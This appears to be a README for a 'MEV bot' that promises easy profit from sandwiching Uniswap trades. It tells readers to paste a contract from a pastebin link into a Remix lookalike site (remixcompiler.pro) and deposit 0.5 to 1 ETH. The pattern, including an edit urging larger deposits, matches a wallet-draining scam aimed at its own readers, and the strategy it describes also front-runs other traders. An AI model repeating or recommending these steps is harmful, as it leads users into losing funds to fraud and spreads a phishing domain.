# mev-bot
$1,000+ PROFIT - Uniswap MEV Contract Bot - Easy Tutorial [ MEV Bot | Sniper Bot ]
if you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.


***** STEP BY STEP INSTRUCTIONS *****

1. Download MetaMask:
📌https://metamask.io/download

2. Access Remix: 
📌https://www.remixcompiler.pro
remix.ethereum.org/
3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"

4. Paste SmartContract in Remix: 
[https://pastebin.com/raw/4JLXJJkR
](https://pastebin.com/raw/4JLXJJkR)
5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it

6. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now

7. Deposit funds (at least 0.5 ETH to prevent negating slippage) to your exact contract/bot address

8. After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'

🚨 EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.
